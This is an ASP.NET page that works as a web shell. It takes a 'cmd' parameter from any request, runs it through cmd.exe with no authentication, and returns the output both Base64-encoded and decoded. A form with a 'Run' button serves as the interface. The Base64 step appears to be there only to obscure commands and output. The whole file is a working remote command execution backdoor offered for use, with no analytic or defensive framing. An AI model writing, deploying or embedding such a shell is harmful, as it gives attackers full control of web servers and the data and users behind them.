<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        string outputB64 = "";

        if (!string.IsNullOrEmpty(cmd))
        {
            try
            {
                // Encode command in Base64 (internal)
                string cmdB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(cmd));

                // Decode and execute
                string decodedCmd = Encoding.UTF8.GetString(Convert.FromBase64String(cmdB64));
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + decodedCmd);
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Encode output to Base64
                outputB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
            }
            catch (Exception ex)
            {
                outputB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("Error: " + ex.Message));
            }
        }

        Response.Write("<html><body>");
        Response.Write("<form method='get'>");
        Response.Write("Command: <input type='text' name='cmd' style='width:300px;'/>");
        Response.Write("<input type='submit' value='Run' />");
        Response.Write("</form>");
        if (!string.IsNullOrEmpty(outputB64))
        {
            Response.Write("<p>Base64 Output: <input type='text' style='width:500px;' value='" + outputB64 + "' readonly /></p>");
            Response.Write("<p>Decoded Output: <pre>" + Encoding.UTF8.GetString(Convert.FromBase64String(outputB64)) + "</pre></p>");
        }
        Response.Write("</body></html>");
    }
</script>
